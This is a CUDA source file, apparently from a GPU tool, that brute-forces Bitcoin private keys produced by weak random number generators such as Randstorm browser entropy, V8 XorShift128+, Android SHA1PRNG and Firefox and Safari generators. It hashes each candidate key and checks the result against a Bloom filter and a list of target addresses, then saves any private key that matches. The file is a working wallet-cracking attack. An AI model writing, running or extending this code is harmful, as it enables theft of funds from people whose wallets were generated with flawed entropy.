// scan_kernel.cu
// GPU integration layer: generates keys via seedhammer modes,
// computes HASH160 (SHA256 + RIPEMD160) via vaultwatch kernels,
// and checks against both Bloom filter + exact target list.
//
// Must match bloom_add logic in vaultwatch-cuda.cu exactly.

#ifndef SCAN_KERNEL_CU
#define SCAN_KERNEL_CU

// ================================================================
// Device-side constants (set via cudaMemcpyToSymbol from main.cu)
// Small items stay in __constant__; large arrays (>64KB) use __device__
// ================================================================
__device__ __constant__ uint32_t DEV_BLOOM_BITS;
__device__ __constant__ uint32_t DEV_N_TARGETS;

// ================================================================
// Bloom filter check — MUST BE IDENTICAL to bloom_test() in vaultwatch-cuda.cu
// Uses 7 hash positions: 5 from direct H160 bytes + 2 from mangled hashes
// ================================================================
__device__ static bool bloom_check_gpu(const uint8_t h160[20], const uint8_t *bloom_data) {
    uint32_t m = DEV_BLOOM_BITS - 1;

    // Same 7 hashes as vaultwatch-cuda.cu's bloom_test()
    uint32_t h[7] = {
        ((uint32_t)h160[0]<<24|(uint32_t)h160[1]<<16|(uint32_t)h160[2]<<8|h160[3]) & m,
        ((uint32_t)h160[4]<<24|(uint32_t)h160[5]<<16|(uint32_t)h160[6]<<8|h160[7]) & m,
        ((uint32_t)h160[8]<<24|(uint32_t)h160[9]<<16|(uint32_t)h160[10]<<8|h160[11]) & m,
        ((uint32_t)h160[12]<<24|(uint32_t)h160[13]<<16|(uint32_t)h160[14]<<8|h160[15]) & m,
        ((uint32_t)h160[16]<<24|(uint32_t)h160[17]<<16|(uint32_t)h160[18]<<8|h160[19]) & m,
        ((h160[0]*2654435761u + h160[1]*2246822519u + h160[2]) & m),
        ((h160[3]*3266489917u + h160[4]*668265263u + h160[5]) & m)
    };

    for (int i = 0; i < 7; i++)
        if (!(bloom_data[h[i] >> 3] & (1 << (h[i] & 7))))
            return false;
    return true;
}

// ================================================================
// Host-side Bloom builder — IDENTICAL to vaultwatch's bloom_add
// Called from main.cu to build DEV_BLOOM_DATA then cudaMemcpyToSymbol
// ================================================================
static void bloom_build(uint8_t *bloom_data, uint32_t bloom_bits,
                        const uint8_t *targets, uint32_t n_targets) {
    uint32_t m = bloom_bits - 1;
    for (uint32_t i = 0; i < n_targets; i++) {
        const uint8_t *h = targets + i * 20;
        uint32_t h7[7] = {
            ((uint32_t)h[0]<<24|h[1]<<16|h[2]<<8|h[3]) & m,
            ((uint32_t)h[4]<<24|h[5]<<16|h[6]<<8|h[7]) & m,
            ((uint32_t)h[8]<<24|h[9]<<16|h[10]<<8|h[11]) & m,
            ((uint32_t)h[12]<<24|h[13]<<16|h[14]<<8|h[15]) & m,
            ((uint32_t)h[16]<<24|h[17]<<16|h[18]<<8|h[19]) & m,
            ((h[0]*2654435761u + h[1]*2246822519u + h[2]) & m),
            ((h[3]*3266489917u + h[4]*668265263u + h[5]) & m)
        };
        for (int j = 0; j < 7; j++)
            bloom_data[h7[j] >> 3] |= (1 << (h7[j] & 7));
    }
}

// ================================================================
// Exact match check (binary search on DEV_TARGETS)
// ================================================================
__device__ static bool exact_match_gpu(const uint8_t h160[20], const uint8_t *targets) {
    int lo = 0, hi = (int)DEV_N_TARGETS - 1;
    while (lo <= hi) {
        int mid = (lo + hi) / 2;
        int cmp = 0;
        for (int i = 0; i < 20 && cmp == 0; i++) {
            if (h160[i] < targets[mid*20+i]) cmp = -1;
            else if (h160[i] > targets[mid*20+i]) cmp = 1;
        }
        if (cmp == 0) return true;
        else if (cmp < 0) hi = mid - 1;
        else lo = mid + 1;
    }
    return false;
}

// ================================================================
// ECC: point multiplication on secp256k1 (inlined from vaultwatch)
// Produces compressed + uncompressed public keys from private key
// ================================================================

// Forward declarations used by privkey_hash160_both
// (these come from the included math256.h and ec_jacobian.h headers)

__device__ static void privkey_hash160_both_cu(const uint8_t priv[32],
                                                uint8_t h160_comp[20],
                                                uint8_t h160_uncomp[20]) {
    uint8_t pub_comp[33];
    uint8_t pub_uncomp[65];
    
    // privkey_to_pubkey_both is defined in ec_jacobian.h (included via main.cu)
    privkey_to_pubkey_both(priv, pub_comp, pub_uncomp);
    
    // HASH160 for compressed
    uint8_t sha32[32];
    sha256(pub_comp, 33, sha32);
    // ripemd160 expects 64-byte block with SHA256 padding
    uint8_t rm_block[64];
    for(int i=0;i<32;i++) rm_block[i] = sha32[i];
    rm_block[32] = 0x80;
    for(int i=33;i<56;i++) rm_block[i] = 0;
    uint64_t bits32 = 32*8;
    rm_block[56] = (uint8_t)(bits32); rm_block[57] = (uint8_t)(bits32>>8);
    rm_block[58] = (uint8_t)(bits32>>16); rm_block[59] = (uint8_t)(bits32>>24);
    rm_block[60] = 0; rm_block[61] = 0; rm_block[62] = 0; rm_block[63] = 0;
    ripemd160(rm_block, h160_comp);
    
    // HASH160 for uncompressed
    sha256(pub_uncomp, 65, sha32);
    for(int i=0;i<32;i++) rm_block[i] = sha32[i];
    rm_block[32] = 0x80;
    for(int i=33;i<56;i++) rm_block[i] = 0;
    bits32 = 32*8;
    rm_block[56] = (uint8_t)(bits32); rm_block[57] = (uint8_t)(bits32>>8);
    rm_block[58] = (uint8_t)(bits32>>16); rm_block[59] = (uint8_t)(bits32>>24);
    rm_block[60] = 0; rm_block[61] = 0; rm_block[62] = 0; rm_block[63] = 0;
    ripemd160(rm_block, h160_uncomp);
}

// ================================================================
// super_scan_kernel — The master integration kernel
// Generates keys using seedhammer modes, then verifies via vaultwatch
//
// mode_char: 'M' = MWC1616, 'R' = Randstorm, 'H' = H36,
//            '7' = H07 Android SHA1PRNG, '8' = V8 XorShift128+,
//            'S' = SpiderMonkey LCG, 'J' = JSC MWC1616
// ================================================================
__global__ void super_scan_kernel(
    char       mode_char,
    uint64_t   ts,
    uint32_t   seed_start,
    uint32_t   seed_range,
    uint64_t   count,
    unsigned long long *found_count,
    uint8_t   *found_out,   // 52 bytes per result: 32 priv + 20 h160
    const uint8_t *bloom_data,
    const uint8_t *targets
) {
    uint64_t idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= count) return;

    // Determine the seed / timestamp for this thread
    uint64_t combined_idx = (uint64_t)idx;
    uint32_t seed = seed_start + (uint32_t)(combined_idx % seed_range);
    uint64_t current_ts = ts + combined_idx / seed_range;

    // Generate private key using selected mode
    uint8_t priv[32];

    switch (mode_char) {
        case 'M': // MWC1616 (old Chrome/Node.js 2010-2015)
            seedhammer_mwc(current_ts, priv);
            break;
        case 'R': // Randstorm (browser entropy)
            seedhammer_randstorm(current_ts, seed, priv);
            break;
        case 'H': // H36 (timestamp millisecond)
            seedhammer_h36(current_ts, priv);
            break;
        case '7': // H07 Android SHA1PRNG
            seedhammer_android_rng((uint64_t)seed, priv);
            break;
        case '8': // V8 XorShift128+ (Chrome/Node.js modern)
            seedhammer_v8_xorshift128((uint64_t)seed, priv);
            break;
        case 'S': // SpiderMonkey LCG (Firefox)
            seedhammer_sm_lcg((uint64_t)seed, priv);
            break;
        case 'J': // JSC MWC1616 (Safari)
            seedhammer_jsc_mwc1616((uint64_t)seed, priv);
            break;
        default:
            return; // unknown mode
    }

    // Compute HASH160 (compressed + uncompressed)
    uint8_t h160_comp[20], h160_uncomp[20];
    privkey_hash160_both_cu(priv, h160_comp, h160_uncomp);

    // Check bloom filter first (fast reject)
    bool bloom_pass = false;
    bool is_compressed = false;

    if (bloom_check_gpu(h160_comp, bloom_data)) {
        bloom_pass = true;
        is_compressed = true;
    }
    if (!bloom_pass && bloom_check_gpu(h160_uncomp, bloom_data)) {
        bloom_pass = true;
        is_compressed = false;
    }

    // If bloom passes, do exact match (no false positives)
    bool exact_found = false;
    if (bloom_pass) {
        const uint8_t *h = is_compressed ? h160_comp : h160_uncomp;
        if (exact_match_gpu(h, targets)) {
            exact_found = true;
        }
    }

    // If exact match found, write to output
    if (exact_found) {
        unsigned long long slot = atomicAdd(found_count, 1ULL);
        if (slot < 256) { // max 256 found keys per batch
            uint8_t *out = found_out + slot * 52;
            for (int i = 0; i < 32; i++) out[i] = priv[i];
            const uint8_t *h = is_compressed ? h160_comp : h160_uncomp;
            for (int i = 0; i < 20; i++) out[32 + i] = h[i];
        }
    }
}

#endif // SCAN_KERNEL_CU
